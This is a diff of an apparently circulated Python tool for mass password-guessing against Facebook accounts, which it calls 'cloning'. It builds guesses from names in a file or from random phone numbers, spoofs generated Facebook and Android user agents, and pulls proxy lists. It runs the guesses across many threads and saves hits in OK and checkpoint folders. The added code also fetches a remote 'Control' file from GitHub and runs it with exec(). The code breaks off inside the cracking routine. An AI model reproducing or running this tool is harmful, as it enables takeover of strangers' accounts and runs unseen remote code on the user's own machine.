@@ -1,359 +1,469 @@
-# SOURCE BY: DHANU
-# GIFT BY: THARINDU N. DHANUSHKA
-
-import os
-import base64
-import zlib
-import platform
-import requests
-import json
-import time
-import re
-import random
-import sys
-import uuid
-import string
-import subprocess
-from concurrent.futures import ThreadPoolExecutor as tred
-from bs4 import BeautifulSoup as bsp
-print('\n  \x1b[38;5;86mINSTALLING MISSING MODULES ...!')
-os.system("pip uninstall urllib3 requests chardet idna certifi -y")
-os.system("pip install urllib3 requests chardet idna certifi")
-os.system('xdg-open ~')
+W = '\033[1;37m' 
+P = '\033[95;1m' 
+R = '\033[91;1m' 
+G = '\033[92;1m'
+B = '\033[96;1m'
+def line():
+	print(f"{R}-"*47)
+import os,requests,json,time,re,random,sys,uuid,string,subprocess,zlib,platform
+import marshal
+import os,base64
+from os import system as clr
+os.system('clear')
+print(" Loading Tools ...")
+time.sleep(1)
+os.system('clear')
+print(' Join Facebook Group ...')
+os.system("xdg-open ")
 try:
-    from bs4 import BeautifulSoup as bsp
-except ImportError:
-    os.system('pip install bs4')
-    from bs4 import BeautifulSoup as bsp
+	import os,requests,json,time,re,random,sys,uuid,string,subprocess
+	from string import *
+	import bs4
+	from concurrent.futures import ThreadPoolExecutor as tred
+	from bs4 import BeautifulSoup as sop
+	from bs4 import BeautifulSoup
+except ModuleNotFoundError: 
+	os.system('clear')
+except:pass
 try:
     import requests
-    import json
-    import time
-    import re
-    import random
-    import sys
-    import uuid
-    import string
-    import subprocess
-    from string import *
-    from concurrent.futures import ThreadPoolExecutor as tred
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
+    import mechanize
+    from requests.exceptions import ConnectionError
 except ModuleNotFoundError:
-    print('\n  \x1b[38;5;86mInstalling missing modules ...')
-    os.system('pip install requests futures==2 > /dev/null')
-    os.system('python DHANU.py')
-    os.system('xdg-open ~')
-#__________NEW IDX UA_____________#
-
-def DHANU():
-	en = random.choice(['en_US','en_GB','en_PK','ru_RU','de_DE','th_TH','en_BD','en_IN','en_AF'])
-	kt = random.choice(['com.facebook.katana','com.facebook.orca','com.facebook.mlite'])
-	fbcr = random.choice(['o2 - de', 'Verizon - us','MY CELCOM','Vodafone - uk','null','DTAC','IND airtel','Nepal Telecom'])
-	s= "[FBAN/FB4A;FBAV/"+str(random.randint(111,999))+'.0.0.'+str(random.randrange(9,99))+str(random.randint(111,999)) +";FBBV/"+str(random.randint(111111111,999999999))
-	e = "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]""Mozilla/5.0 (Linux; Android 5.0; CHP3818 Build/TP1A.220905.001) [FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM={density=2.5,width=1080,height=1280};]""Mozilla/5.0 (Linux; Android 5.0; CHP3818 Build/SP1A.210812.016) [FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM={density=2.0,width=1920,height=720};]""Mozilla/5.0 (Linux; Android 5.0; CHP3818 Build/SKQ1.210216.001) [FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM={density=2.5,width=1080,height=1080};]""Mozilla/5.0 (Linux; Android 5.0; CHP3818 Build/SKQ1.210216.001) [FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM={density=3.0,width=1920,height=2024};]""Mozilla/5.0 (Linux; Android 5.0; CHP7800 Build/TP1A.220905.001) [FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM={density=1.5,width=720,height=1080};]""Mozilla/5.0 (Linux; Android 5.0; CHP7800 Build/SKQ1.210216.001) [FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM={density=1.5,width=720,height=1280};]""Mozilla/5.0 (Linux; Android 5.0; CHP3818 Build/SP1A.210812.016) [FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM={density=1.0,width=1080,height=1080};]""Mozilla/5.0 (Linux; Android 5.0; CHP7800 Build/RKQ1.211103.002) [FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM={density=3.0,width=1920,height=2024};]""[FBAN/Orca-Android;FBAV/464.0.0.44.109;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/615296900;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-T225;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=1.3312501,width=1340,height=736};FB_FW/1;]"
-
-	ua = s + e	
-	return ua
-
-
-
-#__________BD UA_____________#
-
-ugen=[]
-for agent in range(10000):
-        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
-        b=random.choice(['6','7','8','9','10','11','12'])
-        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
-        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-        e=random.randrange(1, 999)
-        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
-        h=random.randrange(73,100)
-        i='0'
-        j=random.randrange(4200,4900)
-        k=random.randrange(40,150)
-        l='Mobile Safari/533.1'
-        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
-        ugen.append(fullagnt) 
-    
-
-def clear():
-	os.system('clear')
-	print(logo)
-logo=("""
-
-       \x1b[38;5;19m██████\x1b[38;5;246m╗ \x1b[38;5;19m██\x1b[38;5;246m╗  \x1b[38;5;19m██\x1b[38;5;246m╗ \x1b[38;5;19m█████\x1b[38;5;246m╗ \x1b[38;5;19m███\x1b[38;5;246m╗   \x1b[38;5;19m██\x1b[38;5;246m╗\x1b[38;5;19m██\x1b[38;5;246m╗   \x1b[38;5;19m██\x1b[38;5;246m╗
-       \x1b[38;5;19m██\x1b[38;5;246m╔══\x1b[38;5;19m██\x1b[38;5;246m╗\x1b[38;5;19m██\x1b[38;5;246m║  \x1b[38;5;19m██\x1b[38;5;246m║\x1b[38;5;19m██\x1b[38;5;246m╔══\x1b[38;5;19m██\x1b[38;5;246m╗\x1b[38;5;19m████\x1b[38;5;246m╗  \x1b[38;5;19m██\x1b[38;5;246m║\x1b[38;5;19m██\x1b[38;5;246m║   \x1b[38;5;19m██\x1b[38;5;246m║
-       \x1b[38;5;227m██\x1b[38;5;246m║  \x1b[38;5;227m██\x1b[38;5;246m║\x1b[38;5;227m███████\x1b[38;5;246m║\x1b[38;5;227m███████\x1b[38;5;246m║\x1b[38;5;227m██\x1b[38;5;246m╔\x1b[38;5;227m██\x1b[38;5;246m╗ \x1b[38;5;227m██\x1b[38;5;246m║\x1b[38;5;227m██\x1b[38;5;246m║   \x1b[38;5;227m██\x1b[38;5;246m║
-       \x1b[38;5;19m██\x1b[38;5;246m║  \x1b[38;5;19m██\x1b[38;5;246m║\x1b[38;5;19m██\x1b[38;5;246m╔══\x1b[38;5;19m██\x1b[38;5;246m║\x1b[38;5;19m██\x1b[38;5;246m╔══\x1b[38;5;19m██\x1b[38;5;246m║\x1b[38;5;19m██\x1b[38;5;246m║\x1b[38;5;246m╚\x1b[38;5;19m██\x1b[38;5;246m╗\x1b[38;5;19m██\x1b[38;5;246m║\x1b[38;5;19m██\x1b[38;5;246m║   \x1b[38;5;20m██\x1b[38;5;246m║
-       \x1b[38;5;19m██████\x1b[38;5;246m╔╝\x1b[38;5;19m██\x1b[38;5;246m║  \x1b[38;5;19m██\x1b[38;5;246m║\x1b[38;5;19m██\x1b[38;5;246m║  \x1b[38;5;19m██\x1b[38;5;246m║\x1b[38;5;19m██\x1b[38;5;246m║ \x1b[38;5;246m╚\x1b[38;5;19m████\x1b[38;5;246m║\x1b[38;5;246m╚\x1b[38;5;19m██████\x1b[38;5;246m╔╝
-       \x1b[38;5;246m╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝
-                                                                            \x1b[38;5;141m◦◉◎\x1b[38;5;190m🆆🅴🅻🅻 🅲🅾🅼🅴 🅼🆈 🆃🅾🅾🅻\x1b[38;5;141m◎◉◦
-       \x1b[38;5;13m╔═════════════════════════════════════════╗
-       \x1b[38;5;13m║  \x1b[38;5;160mOWNER      \x1b[38;5;91m➜    \x1b[38;5;121mTHARINDU N. DHANUSHKA  \x1b[38;5;13m║
-       \x1b[38;5;13m║  \x1b[38;5;160mFACEBOOK   \x1b[38;5;91m➜    \x1b[38;5;121mDHANU BABAA            \x1b[38;5;13m║
-       \x1b[38;5;13m║  \x1b[38;5;160mSTATUS     \x1b[38;5;91m➜    \x1b[38;5;121mFILE CLONE             \x1b[38;5;13m║
-       \x1b[38;5;13m║  \x1b[38;5;160mTOOL TYPE  \x1b[38;5;91m➜    \x1b[38;5;121mFREE                   \x1b[38;5;13m║
-       \x1b[38;5;13m║  \x1b[38;5;160mVERSION    \x1b[38;5;91m➜    \x1b[38;5;121m00.00                  \x1b[38;5;13m║
-       \x1b[38;5;13m╚═════════════════════════════════════════╝""")
-def line():
-	print(f'\x1b[38;5;105m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-
+    os.system('pkg install python')
+try:
+	os.makedirs('/sdcard/DHANU3-OK')
+	os.makedirs('/sdcard/DHANU3-CP')
+except:
+	pass
+sys.stdout.write('\x1b]2;DHANU3-XD\x07')
+proxy = requests.get('https://raw.githubusercontent.com/Niki404-Cyber/user-agnet/main/aabb.txt').text.splitlines()
+proxy = requests.get('https://raw.githubusercontent.com/Niki404-Cyber/user-agnet/main/pro_3.txt').text.splitlines()
+model3 = requests.get('https://raw.githubusercontent.com/Nill404-Cyber/Secret-Models/main/INFINIX.txt').text.splitlines()
+model2 = requests.get('https://raw.githubusercontent.com/Nill404-Cyber/Secret-Models/main/Galaxy.txt').text.splitlines()
 loop=0
+twf=[]
 oks=[]
 cps=[]
 pcp=[]
-ck=[]
-#_________Year checker_________#
-def asha(uid):
-    if len(uid)==15:
-        if uid[:10] in ['1000000000']       :alif = ' (*-*) 2009 /'
-        elif uid[:9] in ['100000000']       :alif = ' ACCOUNT  2009 /'
-        elif uid[:8] in ['10000000']        :alif = ' ACCOUNT 2009 /'
-        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:alif = ' ACCOUNT 2009 /'
-        elif uid[:7] in ['1000006','1000007','1000008','1000009']:alif = ' ACCOUNT 2010 /'
-        elif uid[:6] in ['100001']          :alif = ' ACCOUNT 2010/2011 /'
-        elif uid[:6] in ['100002','100003'] :alif = ' ACCOUNT 2011/2012 /'
-        elif uid[:6] in ['100004']          :alif = ' ACCOUNT 2012/2013 /'
-        elif uid[:6] in ['100005','100006'] :alif = ' ACCOUNT 2013/2014 /'
-        elif uid[:6] in ['100007','100008'] :alif = ' ACCOUNT 2014/2015 /'
-        elif uid[:6] in ['100009']          :alif = ' ACCOUNT 2015 /'
-        elif uid[:5] in ['10001']           :alif = ' ACCOUNT 2015/2016 /'
-        elif uid[:5] in ['10002']           :alif = ' ACCOUNT 2016/2017 /'
-        elif uid[:5] in ['10003']           :alif = ' ACCOUNT 2018/2019 /'
-        elif uid[:5] in ['10004']           :alif = ' ACCOUNT 2019/2020 /'
-        elif uid[:5] in ['10005']           :alif = ' ACCOUNT 2020 /'
-        elif uid[:5] in ['10006','10007','']:alif = ' ACCOUNT 2021 /'
-        elif uid[:5] in ['10008']           :alif = ' ACCOUNT 2022 /'
-        elif uid[:5] in ['10009']           :alif = ' ACCOUNT 2023 /'
-        else:alif=''
-    elif len(uid) in [9,10]:
-        alif = ' ACCOUNT 2008/2009 /'
-    elif len(uid)==8:
-        alif = ' ACCOUNT 2007/2008 /'
-    elif len(uid)==7:
-        alif = ' ACCOUNT 2006/2007 /'
-    else:alif=''
-    return alif 
+id=[]
+tokenku=[]
+plist = []
+methods = []
+speed = []
+loop = 0
+oks = []
+cps = []
+loop = 0
+oks = []
+cps = []
+mtd,cp_cpx,cokix=[],[],[]
+try:
+	data = requests.get('https://raw.githubusercontent.com/AAMIR-404/Control/main/Data').text
+	exec(data)
+except:
+	print('[+] You Have No Internet Connection');exit()
+def line():
+	print(f"\x1b[1;91m-----------------------------------------------\x1b[1;97m")
+def clear():
+	os.system(f'clear')
+	print(logo)
+logo=(f"""
+\x1b[1;91m██████╗ ██╗  ██╗ █████╗ ███╗   ██╗██╗   ██╗    ██████╗ 
+\x1b[1;92m██╔══██╗██║  ██║██╔══██╗████╗  ██║██║   ██║    ╚════██╗
+\x1b[1;93m██║  ██║███████║███████║██╔██╗ ██║██║   ██║     █████╔╝
+\x1b[1;93m██║  ██║██╔══██║██╔══██║██║╚██╗██║██║   ██║     ╚═══██╗
+\x1b[1;92m██████╔╝██║  ██║██║  ██║██║ ╚████║╚██████╔╝    ██████╔╝
+\x1b[1;91m╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝     ╚═════╝ 
+\x1b[1;91m-----------------------------------------------
+\x1b[1;91m[\x1b[1;92m=\x1b[1;91m] \x1b[1;97mAUTHOR  \x1b[1;92m: \x1b[1;97mDHANU3-XD
+\x1b[1;91m[\x1b[1;92m=\x1b[1;91m] \x1b[1;97mGitHub  \x1b[1;92m: \x1b[1;97mhttps://github.com/DHANU3-ERror
+\x1b[1;91m[\x1b[1;92m=\x1b[1;91m] \x1b[1;97mVersion \x1b[1;92m: \x1b[1;91m1.0\x1b[1;92m|\x1b[1;92mUpdated
+\x1b[1;91m-----------------------------------------------""")
+ugen = []
+ugen2 = []
+ugen3 = []
+ugenn = []
+for xd in range(5000):
+    a='Mozilla/5.0 (Symbian/3; Series60/'
+    b=random.randrange(1, 9)
+    c=random.randrange(1, 9)
+    d='Nokia'
+    e=random.randrange(100, 9999)
+    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
+    g=random.randrange(1, 9)
+    h=random.randrange(1, 4)
+    i=random.randrange(1, 4)
+    j=random.randrange(1, 4)
+    k='Mobile Safari/535.1'
+    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
+    ugen2.append(uaku)
 
-#_________Cloning Menu_________#
-def menu():
+
+    aa='Mozilla/5.0 (Linux; U; Android'
+    b=random.choice(['5','6','7','8','9','10','11','12'])
+    if b in ['5', '6', '7', '8', '9']:
+        z=random.choice(['0', '1'])
+        bv=b+'.'+z+'.'+z
+    else:
+        bv=b
+    C=['GT-', 'SM-']
+    c=random.choice(C)
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36'
+    application_version = str(random.randint(111,396))+'.0.0.'+str(random.randrange(10,49))+'.'+str(random.randint(111,396))
+    V=str(random.randrange(11,99))
+    uaku2=f'{aa} {bv}; {c}{d}{e}{f} Build/{d}{f}{V}{f}; wv) {g}{h}.{i}.{j}.{k} {l} [FBAN/EMA;FBLC/en_US;FBAV/{application_version};]'
+    #[FBAN/EMA;FBLC/en_US;FBAV/331.0.0.9.105;]'
+    #[FB_IAB/FB4A;FBAV/127.0.0.22.69;]'
+    ugen.append(uaku2)
+
+for xd in range(5000):
+    aa='Mozilla/5.0 (Macintosh;'
+    b=random.choice(['6','7','8','9','10','11','12'])
+    c='Intel Mac OS'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Safari/537.36 Edg/'
+    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+    ugenn.append(uaku2)
+
+
+
+
+
+'''---------[ GRAPH USER-AGENT ]-------'''
+def DHANU3_MIX():
+    vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
+    VAPP = random.randint(410000000,499999999)
+    END = '[FBAN/FB4A;FBAV/257.0.0.44.118;FBBV/197851400;FBDM/{density=2.25,width=720,height=1280};FBLC/en_US;FBRV/201443087;FBCR/ ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S367VL;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
+    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
+    return ua
+
+
+def randBuildvsskj():
+    END = '[FBAN/FB4A;FBAV/267.1.0.46.120;FBBV/210653466;FBDM/{density=3.0,width=1080,height=2051};FBLC/en_US;FBRV/0;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N975U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]'
+    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model3)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
+    return ua
+
+def web():
+	a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";"
+	b = "[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629348;FBDM/{density=4.5,width=1440,height=2560};FBLC/en_US;FBRV/210561420;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SM-G890A;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
+	ua = a+b
+	return ua    
+    
+'''--------[ END GRAPH USER-AGENT ]-------'''
+
+
+def DHANU3():
+			os.system("clear"),print(logo)
+			print (f'\033[1;32m[{W}1{G}] File Cloning')
+			print (f'\033[1;32m[{W}2{G}] Public id Cloning')
+			print (f'\033[1;32m[{W}3{G}] Random Number Cloning')
+			print (f'\033[1;32m[{W}4{G}] Random Email Cloning')
+			print (f'\033[1;32m[{W}0{G}] Result Check\033[0;97m')
+			print(f"{R}-"*47)
+			xd=input(f"\033[1;36mSelection : \033[0;97m")
+			if xd in ['1','01']:
+				os.system("clear"),print(logo);file = input(f"{W} Put Path File : ")
+				try:
+					fo = open(file,'r').read().splitlines()
+				except FileNotFoundError:
+					print(f"{W} Put File Not Found");time.sleep(1)
+					DHANU3()
+				os.system("clear"),print(logo)
+				print(f"{W} [1] Method ({G}New{W})\n [2] Method ({G}Old{W})\n [3] Method ({G}Other{W})\n");print(f"{R}-"*47);mthd=input(f"{W}[{R}•{W}] {B}Method {W}: ")
+				os.system("clear"),print(logo)
+				plist = []
+				try:					
+					ps_limit = int(input(f"{G}Password {B}Limit Put {W}: "))
+				except:
+					ps_limit =1
+				os.system("clear"),print(logo)
+				for i in range(ps_limit):
+					plist.append(input(f"{G}Password {B}{i+1} {W}: "))
+				os.system("clear"),print(logo)
+				print(f"{W} Facebook {R}CP {W}Account {B}Will Be Show {W}({G}yes{W}/{R}no{W})");print(f"{R}-"*47);cx=input(f"{W} {B}Path Option {W}: ")
+				if cx in ['y','Y','yes','Yes','1']:
+					pcp.append('y')
+				else:
+					pcp.append('n')
+				with tred(max_workers=50) as crack_submit:
+					os.system("clear"),print(logo)
+					total_ids = str(len(fo))
+					print(f"{W}File Name  : {G}{file}")			
+					print(f"{W}File limit : {G}"+total_ids+"")
+					print(f"{B}Facebook Account Save In {G}OK{W}/{R}CP")
+					print(f"{R}-"*47)
+					for user in fo:
+						ids,names = user.split('|')
+						passlist = plist
+						if mthd in ['1','01']:
+							crack_submit.submit(ffbM,ids,names,passlist)
+						elif mthd in ['2','02']:
+							crack_submit.submit(ffbG,ids,names,passlist)
+						elif mthd in ['3','03']:
+							crack_submit.submit(ffbG1,ids,names,passlist)
+				print(f"{R}-"*47)
+				print(f"{W} PROCESS HAS DONE!")								 				
+				print(f"{R}-"*47)
+				input(f"{W} PRESS ENTER TO BACK")
+				os.system('python DHANU3.py')				
+			elif xd in ['2','02']:
+				print(f"{W} {G}Upcoming Soon{W} ...");time.sleep(1)
+				DHANU3()
+			elif xd in ['3','03']:
+				random_number()
+				DHANU3()
+			elif xd in ['4','04']:
+				print(f"{W} {G}Upcoming Soon{W} ...");time.sleep(1)
+				DHANU3()
+			elif xd in ['0','00']:
+				results()
+				exit('exit')
+
+def results():
+	print(f"{W} Something Wrong");time.sleep(1)
+	os.system('clear')
+	DHANU3()
+
+def random_number():
+    user=[]
+    os.system('clear')
+    print(logo)
+    print(f"{W} {G}Example {W}: {G}0300 0304 0318 0324 0331 0341 0349")
+    line()
+    kode = input(f"{W} [{G}•{W}] Put Code : {G}")
+    os.system("clear")
+    print(logo)
+    print(f"{W} {G}Example {W}: {G}777/8888/99999/10000/12000/3000000")
+    line()
+    limit = int(input(f" {W}[{G}•{W}] Crack Limit : {G}"))
+    xd_cp=input(f'\033[1;32m [+] You Want To Show Cp Account : ')
+    if xd_cp in ['y','Y','yes','Yes','1']:cp_cpx.append('y')
+    else:cp_cpx.append('n')
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    with ThreadPool(max_workers=70) as yaari:
+        os.system('clear')
+        print(logo)
+        tl = str(len(user))
+        print(f"{W}[{G}•{W}] {W}Total Password :{G} 2")
+        print(f"{W}[{G}•{W}] {W}Phone Number Code : {G}{kode}")
+        print(f'{W}[{G}•{W}] {W}Random Cloning Limit : {G}'+tl)        
+        
+        line()
+        for guru in user:
+            uid = kode+guru
+            pwx = [guru,]
+            yaari.submit(mumitx,uid,pwx,tl)
+    print(f'{W}-'*47)
+    print(f"{W}[{G}•{W}] Completed"),DHANU3()
+
+
+def ffbM(ids,names,passlist):
+    global loop,oks,cps
+    sys.stdout.write(f"\r\r\033[1;37m[DHANU3-M1] {G}%s{W}|{G}OK{W}:-{G}%s{W}"%(loop,len(oks)));sys.stdout.flush()
+    session = requests.Session()
     try:
-                clear()
-                line()
-                x = ("***")
-                if x == ("***"):
-                        print(' \x1b[38;5;90m(\x1b[38;5;82m1\x1b[38;5;90m)  ➧  \x1b[38;5;191mFILE CLONING')
-                        print(' \x1b[38;5;90m(\x1b[38;5;82m2\x1b[38;5;90m)  ➧  \x1b[38;5;191mEXIT ')
-                        line()
-                        xd=input(' \x1b[38;5;123mCHOOSE AN OPTION: ')
-                        if xd in ['1','01']:
-                                clear()
-                                line()
-                                print('    \x1b[38;5;90mPUT FILE EXAMPLE :  \x1b[38;5;118m/sdcard/file.txt.etc..')
-                                line()
-                                file = input(' \x1b[38;5;155mPUT FILE PATH :   ')
-                                try:
-                                        fo = open(file,'r').read().splitlines()
-                                except FileNotFoundError:
-                                        print(' \x1b[38;5;09mFILE LOCATION NOT FOUND ')
-                                        time.sleep(1)
-                                        menu()
-                                clear()
-                                line()
-                                print('   \x1b[38;5;90m(\x1b[38;5;82m1\x1b[38;5;90m). \x1b[38;5;195mMETHOD-01    \x1b[38;5;196m(\x1b[38;5;227mNOT WORK\x1b[38;5;196m) ')
-                                print('   \x1b[38;5;90m(\x1b[38;5;82m2\x1b[38;5;90m). \x1b[38;5;195mMETHOD-02   ')
-                                line()
-                                mthd=input(' \x1b[38;5;157mCHOOSE : ')
-                                line()
-                                clear()
-                                plist = []
-                                try:
-                                        ps_limit = int(input(' \x1b[38;5;156mHOW MANY PASSWORDS DO YOU WANT TO ADD ? '))
-                                        line()
-                                except:
-                                        ps_limit =1
-                                line()
-                                clear()
-                                line()
-                                print('   \033[1;32m EXAMPLE : \x1b[38;5;143mfirst2000,last2000,firts2001')
-                                line()
-                                for i in range(ps_limit):
-                                        plist.append(input(f' \x1b[38;5;219mPUT PASSWORD \x1b[38;5;193m{i+1}: '))
-                                line()
-                                clear()
-                                line()
-                                print('   \x1b[38;5;229mDO YOU WENT SHOW COOKIES :?  \x1b[38;5;160m(\x1b[38;5;87mY\x1b[38;5;160m/\x1b[38;5;87mN\x1b[38;5;160m): ')
-                                line()
-                                cx=input(' \x1b[38;5;195mCHOOSE : ')
-                                if cx in ['y','Y','yes','Yes','1']:
-                                       pcp.append('\x1b[38;5;219my')
-                                else:
-                                        pcp.append('\x1b[38;5;219mn')
-                                with tred(max_workers=30) as crack_submit:
-                                        clear()
-                                        total_ids = str(len(fo))
-                                        line()
-                                        print('   \x1b[38;5;112mTOTAL ACCOUNT : \033[1;32m'+total_ids+f' ')
-                                        print('   \x1b[38;5;171mUSE FLIGHT MODE \x1b[38;5;160m(\x1b[38;5;190mON\x1b[38;5;160m/\x1b[38;5;190mOFF\x1b[38;5;160m) \x1b[38;5;192m3m \x1b[38;5;171mDURING CLONING')
-                                        line()
-                                        for user in fo:
-                                                ids,names = user.split('|')
-                                                passlist = plist
-                                                if mthd in ['1','01']:
-                                                        crack_submit.submit(api1,ids,names,passlist)
-                                                elif mthd in ['2','02']:
-                                                        crack_submit.submit(newidx,ids,names,passlist)
-                                                elif mthd in ['3','03']:
-                                                        crack_submit.submit(ffb,ids,names,passlist)
-                                                elif mthd in ['4','04']:
-                                                       crack_submit.submit(newidx,ids,names,passlist)        
-                                print('\033[1;37m')
-                                line()
-                                print(' THE PROCESS HAS COMPLETED')
-                                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
-                                line()
-                                input(' PRESS ENTER TO BACK ')
-                                os.system('python DHANU.py')
-                        elif xd in ['2','02']:
-                                clear()
-                                print(' \033[1;37m[\033[1;32m1\033[1;37m]\033[1;37m PAKISTAN CLONING\n \033[1;37m[\033[1;32m2\033[1;37m]\033[1;37m BANGLADESH CLONING\n \033[1;37m[\033[1;32m3\033[1;37m]\033[1;37m AFGHANISTAN CLONING\n \033[1;37m[\033[1;32m4\033[1;37m]\033[1;37m INDIA CLONING\n \033[1;37m[\033[1;32m5\033[1;37m]\033[1;37m GMAIL CLONING\n \033[1;37m[\033[1;32m0\033[1;37m]\033[1;37m BACK MENU')
-                                line()
-                                x=input(' Choose: ')
-                                if x in ['1','01']:
-                                        pak()
-                                elif x in ['2','02']:
-                                        bd()
-                                elif x in ['3','03']:
-                                        afg()
-                                elif x in ['4','04']:
-                                        ind()        
-                                elif x in ['5','05']:  
-                                        gmail()      
-                                else:
-                                        menu()                                   
-                        elif xd in ['0','00']:
-                                exit()
-                        
-    except requests.exceptions.ConnectionError:
-                print('\n NO INTERNET CONNECTION ...')
-                exit()
-def ffb(ids,names,passlist):
-        global loop,oks,cps
-        sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mDHANU\x1b[1;92m-\x1b[1;92mM3\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-        session = requests.Session()
+        first = names.split(' ')[0]
         try:
-                first = names.split(' ')[0]
-                try:
-                        last = names.split(' ')[1]
-                except:
-                        last = 'Khan'
-                ps = first.lower()
-                ps2 = last.lower()
-                for fikr in passlist:
-                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
-                        #ua = random.choice()
